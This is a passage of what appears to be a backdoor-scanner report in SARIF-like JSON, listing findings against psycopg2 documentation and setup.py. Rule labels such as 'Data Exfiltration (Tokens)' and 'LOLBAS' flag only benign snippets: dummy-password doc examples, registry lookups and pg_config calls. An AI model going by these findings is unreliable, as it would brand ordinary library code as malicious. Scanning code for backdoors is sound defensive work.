                      "markdown": "`\n        >>> from psycopg2.extensions import parse_dsn\n        >>> parse_dsn('dbname=test user=postgres password=secret')\n        {'password': 'secret', 'user': 'postgres', 'dbname': 'test'}\n        >>> parse_dsn(\"postgresql://someone@example.com/somedb?connect_timeout=10\")\n        {'host': 'example.com', 'user': 'someone', 'dbname': 'somedb', 'connect_timeout': '10'}\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 660,
                  "startColumn": 49,
                  "endLine": 660,
                  "endColumn": 57,
                  "snippet": {
                    "text": "    Example::\n\n        >>> from psycopg2.extensions import parse_dsn\n        >>> parse_dsn('dbname=test user=postgres password=secret')\n        {'password': 'secret', 'user': 'postgres', 'dbname': 'test'}\n        >>> parse_dsn(\"postgresql://someone@example.com/somedb?connect_timeout=10\")\n        {'host': 'example.com', 'user': 'someone', 'dbname': 'somedb', 'connect_timeout': '10'}\n",
                    "rendered": {
                      "text": "    Example::\n\n        >>> from psycopg2.extensions import parse_dsn\n        >>> parse_dsn('dbname=test user=postgres password=secret')\n        {'password': 'secret', 'user': 'postgres', 'dbname': 'test'}\n        >>> parse_dsn(\"postgresql://someone@example.com/somedb?connect_timeout=10\")\n        {'host': 'example.com', 'user': 'someone', 'dbname': 'somedb', 'connect_timeout': '10'}\n",
                      "markdown": "`    Example::\n\n        >>> from psycopg2.extensions import parse_dsn\n        >>> parse_dsn('dbname=test user=postgres password=secret')\n        {'password': 'secret', 'user': 'postgres', 'dbname': 'test'}\n        >>> parse_dsn(\"postgresql://someone@example.com/somedb?connect_timeout=10\")\n        {'host': 'example.com', 'user': 'someone', 'dbname': 'somedb', 'connect_timeout': '10'}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 641,
                  "startColumn": 26,
                  "endLine": 641,
                  "endColumn": 34,
                  "snippet": {
                    "text": "\n        >>> from psycopg2.extensions import make_dsn\n        >>> make_dsn('dbname=foo host=example.com', password=\"s3cr3t\")\n        'host=example.com password=s3cr3t dbname=foo'\n\n    .. versionadded:: 2.7\n\n",
                    "rendered": {
                      "text": "\n        >>> from psycopg2.extensions import make_dsn\n        >>> make_dsn('dbname=foo host=example.com', password=\"s3cr3t\")\n        'host=example.com password=s3cr3t dbname=foo'\n\n    .. versionadded:: 2.7\n\n",
                      "markdown": "`\n        >>> from psycopg2.extensions import make_dsn\n        >>> make_dsn('dbname=foo host=example.com', password=\"s3cr3t\")\n        'host=example.com password=s3cr3t dbname=foo'\n\n    .. versionadded:: 2.7\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 640,
                  "startColumn": 52,
                  "endLine": 640,
                  "endColumn": 60,
                  "snippet": {
                    "text": "    Example::\n\n        >>> from psycopg2.extensions import make_dsn\n        >>> make_dsn('dbname=foo host=example.com', password=\"s3cr3t\")\n        'host=example.com password=s3cr3t dbname=foo'\n\n    .. versionadded:: 2.7\n",
                    "rendered": {
                      "text": "    Example::\n\n        >>> from psycopg2.extensions import make_dsn\n        >>> make_dsn('dbname=foo host=example.com', password=\"s3cr3t\")\n        'host=example.com password=s3cr3t dbname=foo'\n\n    .. versionadded:: 2.7\n",
                      "markdown": "`    Example::\n\n        >>> from psycopg2.extensions import make_dsn\n        >>> make_dsn('dbname=foo host=example.com', password=\"s3cr3t\")\n        'host=example.com password=s3cr3t dbname=foo'\n\n    .. versionadded:: 2.7\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 199,
                  "startColumn": 28,
                  "endLine": 199,
                  "endColumn": 36,
                  "snippet": {
                    "text": "    .. autoattribute:: socket\n    .. autoattribute:: backend_pid\n    .. autoattribute:: needs_password\n    .. autoattribute:: used_password\n    .. autoattribute:: ssl_in_use\n    .. automethod:: ssl_attribute(name)\n    .. autoattribute:: ssl_attribute_names\n",
                    "rendered": {
                      "text": "    .. autoattribute:: socket\n    .. autoattribute:: backend_pid\n    .. autoattribute:: needs_password\n    .. autoattribute:: used_password\n    .. autoattribute:: ssl_in_use\n    .. automethod:: ssl_attribute(name)\n    .. autoattribute:: ssl_attribute_names\n",
                      "markdown": "`    .. autoattribute:: socket\n    .. autoattribute:: backend_pid\n    .. autoattribute:: needs_password\n    .. autoattribute:: used_password\n    .. autoattribute:: ssl_in_use\n    .. automethod:: ssl_attribute(name)\n    .. autoattribute:: ssl_attribute_names\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 198,
                  "startColumn": 29,
                  "endLine": 198,
                  "endColumn": 37,
                  "snippet": {
                    "text": "    .. autoattribute:: error_message\n    .. autoattribute:: socket\n    .. autoattribute:: backend_pid\n    .. autoattribute:: needs_password\n    .. autoattribute:: used_password\n    .. autoattribute:: ssl_in_use\n    .. automethod:: ssl_attribute(name)\n",
                    "rendered": {
                      "text": "    .. autoattribute:: error_message\n    .. autoattribute:: socket\n    .. autoattribute:: backend_pid\n    .. autoattribute:: needs_password\n    .. autoattribute:: used_password\n    .. autoattribute:: ssl_in_use\n    .. automethod:: ssl_attribute(name)\n",
                      "markdown": "`    .. autoattribute:: error_message\n    .. autoattribute:: socket\n    .. autoattribute:: backend_pid\n    .. autoattribute:: needs_password\n    .. autoattribute:: used_password\n    .. autoattribute:: ssl_in_use\n    .. automethod:: ssl_attribute(name)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extensions.rst"
                },
                "region": {
                  "startLine": 164,
                  "startColumn": 23,
                  "endLine": 164,
                  "endColumn": 31,
                  "snippet": {
                    "text": "\n    .. autoattribute:: dbname\n    .. autoattribute:: user\n    .. autoattribute:: password\n    .. autoattribute:: host\n    .. autoattribute:: port\n    .. autoattribute:: options\n",
                    "rendered": {
                      "text": "\n    .. autoattribute:: dbname\n    .. autoattribute:: user\n    .. autoattribute:: password\n    .. autoattribute:: host\n    .. autoattribute:: port\n    .. autoattribute:: options\n",
                      "markdown": "`\n    .. autoattribute:: dbname\n    .. autoattribute:: user\n    .. autoattribute:: password\n    .. autoattribute:: host\n    .. autoattribute:: port\n    .. autoattribute:: options\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/errorcodes.rst"
                },
                "region": {
                  "startLine": 26,
                  "startColumn": 59,
                  "endLine": 26,
                  "endColumn": 63,
                  "snippet": {
                    "text": "    All messages emitted by the PostgreSQL server are assigned five-character\n    error codes that follow the SQL standard's conventions for :sql:`SQLSTATE`\n    codes.  Applications that need to know which error condition has occurred\n    should usually test the error code, rather than looking at the textual\n    error message.  The error codes are less likely to change across\n    PostgreSQL releases, and also are not subject to change due to\n    localization of error messages. Note that some, but not all, of the error\n",
                    "rendered": {
                      "text": "    All messages emitted by the PostgreSQL server are assigned five-character\n    error codes that follow the SQL standard's conventions for :sql:`SQLSTATE`\n    codes.  Applications that need to know which error condition has occurred\n    should usually test the error code, rather than looking at the textual\n    error message.  The error codes are less likely to change across\n    PostgreSQL releases, and also are not subject to change due to\n    localization of error messages. Note that some, but not all, of the error\n",
                      "markdown": "`    All messages emitted by the PostgreSQL server are assigned five-character\n    error codes that follow the SQL standard's conventions for :sql:`SQLSTATE`\n    codes.  Applications that need to know which error condition has occurred\n    should usually test the error code, rather than looking at the textual\n    error message.  The error codes are less likely to change across\n    PostgreSQL releases, and also are not subject to change due to\n    localization of error messages. Note that some, but not all, of the error\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/pep-0249.txt"
                },
                "region": {
                  "startLine": 941,
                  "startColumn": 47,
                  "endLine": 941,
                  "endColumn": 55,
                  "snippet": {
                    "text": "\n        E.g. a connect could look like this:\n\n        connect(dsn='myhost:MYDB',user='guido',password='234$')\n\n    [2] Module implementors should prefer 'numeric', 'named' or\n        'pyformat' over the other formats because these offer more\n",
                    "rendered": {
                      "text": "\n        E.g. a connect could look like this:\n\n        connect(dsn='myhost:MYDB',user='guido',password='234$')\n\n    [2] Module implementors should prefer 'numeric', 'named' or\n        'pyformat' over the other formats because these offer more\n",
                      "markdown": "`\n        E.g. a connect could look like this:\n\n        connect(dsn='myhost:MYDB',user='guido',password='234$')\n\n    [2] Module implementors should prefer 'numeric', 'named' or\n        'pyformat' over the other formats because these offer more\n`"
                    }
                  },
                  "sourceLanguage": "plaintext"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/pep-0249.txt"
                },
                "region": {
                  "startLine": 935,
                  "startColumn": 20,
                  "endLine": 935,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\n        dsn         Data source name as string\n        user        User name as string (optional)\n        password    Password as string (optional)\n        host        Hostname (optional)\n        database    Database name (optional)\n\n",
                    "rendered": {
                      "text": "\n        dsn         Data source name as string\n        user        User name as string (optional)\n        password    Password as string (optional)\n        host        Hostname (optional)\n        database    Database name (optional)\n\n",
                      "markdown": "`\n        dsn         Data source name as string\n        user        User name as string (optional)\n        password    Password as string (optional)\n        host        Hostname (optional)\n        database    Database name (optional)\n\n`"
                    }
                  },
                  "sourceLanguage": "plaintext"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/pep-0249.txt"
                },
                "region": {
                  "startLine": 935,
                  "startColumn": 8,
                  "endLine": 935,
                  "endColumn": 16,
                  "snippet": {
                    "text": "\n        dsn         Data source name as string\n        user        User name as string (optional)\n        password    Password as string (optional)\n        host        Hostname (optional)\n        database    Database name (optional)\n\n",
                    "rendered": {
                      "text": "\n        dsn         Data source name as string\n        user        User name as string (optional)\n        password    Password as string (optional)\n        host        Hostname (optional)\n        database    Database name (optional)\n\n",
                      "markdown": "`\n        dsn         Data source name as string\n        user        User name as string (optional)\n        password    Password as string (optional)\n        host        Hostname (optional)\n        database    Database name (optional)\n\n`"
                    }
                  },
                  "sourceLanguage": "plaintext"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/setup.py"
                },
                "region": {
                  "startLine": 438,
                  "startColumn": 22,
                  "endLine": 438,
                  "endColumn": 26,
                  "snippet": {
                    "text": "def is_py_64():\n    # sys.maxint not available since Py 3.1;\n    # sys.maxsize not available before Py 2.6;\n    # this is portable at least between Py 2.4 and 3.4.\n    import struct\n    return struct.calcsize(\"P\") > 4\n\n",
                    "rendered": {
                      "text": "def is_py_64():\n    # sys.maxint not available since Py 3.1;\n    # sys.maxsize not available before Py 2.6;\n    # this is portable at least between Py 2.4 and 3.4.\n    import struct\n    return struct.calcsize(\"P\") > 4\n\n",
                      "markdown": "`def is_py_64():\n    # sys.maxint not available since Py 3.1;\n    # sys.maxsize not available before Py 2.6;\n    # this is portable at least between Py 2.4 and 3.4.\n    import struct\n    return struct.calcsize(\"P\") > 4\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/setup.py"
                },
                "region": {
                  "startLine": 288,
                  "startColumn": 73,
                  "endLine": 289,
                  "snippet": {
                    "text": "If you want to install psycopg2 from source, please install the packages\nrequired for the build and try again.\n\nFor further information please check the 'doc/src/install.rst' file (also at\n<https://www.psycopg.org/docs/install.html>).\n\n\"\"\")\n            raise\n",
                    "rendered": {
                      "text": "If you want to install psycopg2 from source, please install the packages\nrequired for the build and try again.\n\nFor further information please check the 'doc/src/install.rst' file (also at\n<https://www.psycopg.org/docs/install.html>).\n\n\"\"\")\n            raise\n",
                      "markdown": "`If you want to install psycopg2 from source, please install the packages\nrequired for the build and try again.\n\nFor further information please check the 'doc/src/install.rst' file (also at\n<https://www.psycopg.org/docs/install.html>).\n\n\"\"\")\n            raise\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/setup.py"
                },
                "region": {
                  "startLine": 164,
                  "startColumn": 7,
                  "endLine": 164,
                  "endColumn": 12,
                  "snippet": {
                    "text": "    def _get_pg_config_from_registry(self):\n        import winreg\n\n        reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)\n        try:\n            pg_inst_list_key = winreg.OpenKey(reg,\n                'SOFTWARE\\\\PostgreSQL\\\\Installations')\n",
                    "rendered": {
                      "text": "    def _get_pg_config_from_registry(self):\n        import winreg\n\n        reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)\n        try:\n            pg_inst_list_key = winreg.OpenKey(reg,\n                'SOFTWARE\\\\PostgreSQL\\\\Installations')\n",
                      "markdown": "`    def _get_pg_config_from_registry(self):\n        import winreg\n\n        reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)\n        try:\n            pg_inst_list_key = winreg.OpenKey(reg,\n                'SOFTWARE\\\\PostgreSQL\\\\Installations')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/setup.py"
                },
                "region": {
                  "startLine": 100,
                  "startColumn": 73,
                  "endLine": 101,
                  "snippet": {
                    "text": "If you prefer to avoid building psycopg2 from source, please install the PyPI\n'psycopg2-binary' package instead.\n\nFor further information please check the 'doc/src/install.rst' file (also at\n<https://www.psycopg.org/docs/install.html>).\n\n\"\"\")\n            sys.exit(1)\n",
                    "rendered": {
                      "text": "If you prefer to avoid building psycopg2 from source, please install the PyPI\n'psycopg2-binary' package instead.\n\nFor further information please check the 'doc/src/install.rst' file (also at\n<https://www.psycopg.org/docs/install.html>).\n\n\"\"\")\n            sys.exit(1)\n",
                      "markdown": "`If you prefer to avoid building psycopg2 from source, please install the PyPI\n'psycopg2-binary' package instead.\n\nFor further information please check the 'doc/src/install.rst' file (also at\n<https://www.psycopg.org/docs/install.html>).\n\n\"\"\")\n            sys.exit(1)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/setup.py"
                },
                "region": {
                  "startLine": 41,
                  "startColumn": 13,
                  "endLine": 41,
                  "endColumn": 17,
                  "snippet": {
                    "text": "\nimport configparser\n\n# Take a look at https://www.python.org/dev/peps/pep-0440/\n# for a consistent versioning pattern.\n\nPSYCOPG_VERSION = '2.9.10.dev1'\n",
                    "rendered": {
                      "text": "\nimport configparser\n\n# Take a look at https://www.python.org/dev/peps/pep-0440/\n# for a consistent versioning pattern.\n\nPSYCOPG_VERSION = '2.9.10.dev1'\n",
                      "markdown": "`\nimport configparser\n\n# Take a look at https://www.python.org/dev/peps/pep-0440/\n# for a consistent versioning pattern.\n\nPSYCOPG_VERSION = '2.9.10.dev1'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/setup.py"
                },
                "region": {
                  "startLine": 498,
                  "startColumn": 12,
                  "endLine": 498,
                  "endColumn": 18,
                  "snippet": {
                    "text": "parser = configparser.ConfigParser()\nparser.read('setup.cfg')\n\n# generate a nice version string to avoid confusion when users report bugs\nversion_flags.append('pq3')     # no more a choice\nversion_flags.append('ext')     # no more a choice\n\n",
                    "rendered": {
                      "text": "parser = configparser.ConfigParser()\nparser.read('setup.cfg')\n\n# generate a nice version string to avoid confusion when users report bugs\nversion_flags.append('pq3')     # no more a choice\nversion_flags.append('ext')     # no more a choice\n\n",
                      "markdown": "`parser = configparser.ConfigParser()\nparser.read('setup.cfg')\n\n# generate a nice version string to avoid confusion when users report bugs\nversion_flags.append('pq3')     # no more a choice\nversion_flags.append('ext')     # no more a choice\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/setup.py"
                },
                "region": {
                  "startLine": 215,
                  "startColumn": 22,
                  "endLine": 215,
                  "endColumn": 31,
                  "snippet": {
                    "text": "        ('pg-config=', None,\n         \"The name of the pg_config binary and/or full path to find it\"),\n        ('have-ssl', None,\n         \"Compile with OpenSSL built PostgreSQL libraries (Windows only).\"),\n        ('static-libpq', None,\n         \"Statically link the PostgreSQL client library\"),\n    ])\n",
                    "rendered": {
                      "text": "        ('pg-config=', None,\n         \"The name of the pg_config binary and/or full path to find it\"),\n        ('have-ssl', None,\n         \"Compile with OpenSSL built PostgreSQL libraries (Windows only).\"),\n        ('static-libpq', None,\n         \"Statically link the PostgreSQL client library\"),\n    ])\n",
                      "markdown": "`        ('pg-config=', None,\n         \"The name of the pg_config binary and/or full path to find it\"),\n        ('have-ssl', None,\n         \"Compile with OpenSSL built PostgreSQL libraries (Windows only).\"),\n        ('static-libpq', None,\n         \"Statically link the PostgreSQL client library\"),\n    ])\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/setup.py"
                },
                "region": {
                  "startLine": 213,
                  "startColumn": 62,
                  "endLine": 213,
                  "endColumn": 68,
                  "snippet": {
                    "text": "        ('use-pydatetime', None,\n         \"Use Python datatime objects for date and time representation.\"),\n        ('pg-config=', None,\n         \"The name of the pg_config binary and/or full path to find it\"),\n        ('have-ssl', None,\n         \"Compile with OpenSSL built PostgreSQL libraries (Windows only).\"),\n        ('static-libpq', None,\n",
                    "rendered": {
                      "text": "        ('use-pydatetime', None,\n         \"Use Python datatime objects for date and time representation.\"),\n        ('pg-config=', None,\n         \"The name of the pg_config binary and/or full path to find it\"),\n        ('have-ssl', None,\n         \"Compile with OpenSSL built PostgreSQL libraries (Windows only).\"),\n        ('static-libpq', None,\n",
                      "markdown": "`        ('use-pydatetime', None,\n         \"Use Python datatime objects for date and time representation.\"),\n        ('pg-config=', None,\n         \"The name of the pg_config binary and/or full path to find it\"),\n        ('have-ssl', None,\n         \"Compile with OpenSSL built PostgreSQL libraries (Windows only).\"),\n        ('static-libpq', None,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/setup.py"
                },
                "region": {
                  "startLine": 211,
                  "startColumn": 50,
                  "endLine": 211,
                  "endColumn": 56,
                  "snippet": {
                    "text": "    user_options = build_ext.user_options[:]\n    user_options.extend([\n        ('use-pydatetime', None,\n         \"Use Python datatime objects for date and time representation.\"),\n        ('pg-config=', None,\n         \"The name of the pg_config binary and/or full path to find it\"),\n        ('have-ssl', None,\n",
                    "rendered": {
                      "text": "    user_options = build_ext.user_options[:]\n    user_options.extend([\n        ('use-pydatetime', None,\n         \"Use Python datatime objects for date and time representation.\"),\n        ('pg-config=', None,\n         \"The name of the pg_config binary and/or full path to find it\"),\n        ('have-ssl', None,\n",
                      "markdown": "`    user_options = build_ext.user_options[:]\n    user_options.extend([\n        ('use-pydatetime', None,\n         \"Use Python datatime objects for date and time representation.\"),\n        ('pg-config=', None,\n         \"The name of the pg_config binary and/or full path to find it\"),\n        ('have-ssl', None,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/setup.py"
                },
                "region": {
                  "startLine": 153,
                  "startColumn": 53,
                  "endLine": 153,
                  "endColumn": 59,
                  "snippet": {
                    "text": "        if pg_config_exe:\n            return pg_config_exe\n\n        # Now, try looking in the Windows Registry to find a PostgreSQL\n        # installation, and infer the path from that.\n        pg_config_exe = self._get_pg_config_from_registry()\n        if pg_config_exe:\n",
                    "rendered": {
                      "text": "        if pg_config_exe:\n            return pg_config_exe\n\n        # Now, try looking in the Windows Registry to find a PostgreSQL\n        # installation, and infer the path from that.\n        pg_config_exe = self._get_pg_config_from_registry()\n        if pg_config_exe:\n",
                      "markdown": "`        if pg_config_exe:\n            return pg_config_exe\n\n        # Now, try looking in the Windows Registry to find a PostgreSQL\n        # installation, and infer the path from that.\n        pg_config_exe = self._get_pg_config_from_registry()\n        if pg_config_exe:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/setup.py"
                },
                "region": {
                  "startLine": 116,
                  "startColumn": 27,
                  "endLine": 116,
                  "endColumn": 33,
                  "snippet": {
                    "text": "                stderr=subprocess.PIPE)\n        except OSError:\n            raise Warning(\n                f\"Unable to find 'pg_config' file in '{self.pg_config_exe}'\")\n        if pg_config_process.returncode:\n            err = pg_config_process.stderr.decode(errors='backslashreplace')\n            raise Warning(f\"pg_config --{attr_name} failed: {err}\")\n",
                    "rendered": {
                      "text": "                stderr=subprocess.PIPE)\n        except OSError:\n            raise Warning(\n                f\"Unable to find 'pg_config' file in '{self.pg_config_exe}'\")\n        if pg_config_process.returncode:\n            err = pg_config_process.stderr.decode(errors='backslashreplace')\n            raise Warning(f\"pg_config --{attr_name} failed: {err}\")\n",
                      "markdown": "`                stderr=subprocess.PIPE)\n        except OSError:\n            raise Warning(\n                f\"Unable to find 'pg_config' file in '{self.pg_config_exe}'\")\n        if pg_config_process.returncode:\n            err = pg_config_process.stderr.decode(errors='backslashreplace')\n            raise Warning(f\"pg_config --{attr_name} failed: {err}\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/setup.py"
                },
                "region": {
                  "startLine": 523,
                  "startColumn": 20,
                  "endLine": 523,
                  "endColumn": 25,
                  "snippet": {
                    "text": "# Looks like setuptools or some other cog doesn't add them to the command line\n# when called e.g. with \"pip -e git+url'. This results in declarations\n# duplicate on the commandline, which I hope is not a problem.\nfor define in parser.get('build_ext', 'define').split(','):\n    if define:\n        define_macros.append((define, '1'))\n\n",
                    "rendered": {
                      "text": "# Looks like setuptools or some other cog doesn't add them to the command line\n# when called e.g. with \"pip -e git+url'. This results in declarations\n# duplicate on the commandline, which I hope is not a problem.\nfor define in parser.get('build_ext', 'define').split(','):\n    if define:\n        define_macros.append((define, '1'))\n\n",
                      "markdown": "`# Looks like setuptools or some other cog doesn't add them to the command line\n# when called e.g. with \"pip -e git+url'. This results in declarations\n# duplicate on the commandline, which I hope is not a problem.\nfor define in parser.get('build_ext', 'define').split(','):\n    if define:\n        define_macros.append((define, '1'))\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
